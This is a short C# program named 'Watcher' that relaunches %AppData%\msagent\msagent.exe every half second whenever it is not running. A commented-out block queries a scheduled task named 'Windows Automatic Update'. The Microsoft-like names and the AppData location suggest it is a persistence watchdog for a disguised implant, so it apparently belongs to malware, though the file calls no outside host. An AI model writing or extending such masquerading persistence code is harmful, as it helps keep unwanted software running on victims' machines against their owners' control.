using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace Watcher
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        /// 

        [DllImport("Kernel32.dll")]
        private extern static uint WinExec(string cmdline, uint cmdshow);


        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Watcher();
        }

        static private void Watcher()
        {
            while (true)
            {
                //ProcessStartInfo info = new ProcessStartInfo
                //{
                //    FileName = "schtasks.exe",
                //    Arguments = "/query /fo LIST /tn \"Windows Automatic Update\"",
                //    UseShellExecute = false,
                //    RedirectStandardOutput = true,
                //    CreateNoWindow = true
                //};
                //Process schtasks = new Process();
                //schtasks.StartInfo = info;
                //schtasks.Start();
                //while (!schtasks.StandardOutput.EndOfStream)
                //{
                //    string line = schtasks.StandardOutput.ReadLine();
                //    // do something with line
                //}


                if (Process.GetProcessesByName("msagent").Length == 0)
                {
                    string client = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\msagent\\msagent.exe";
                    Process.Start(client);
                }
                Thread.Sleep(500);
            }
        }
    }
}
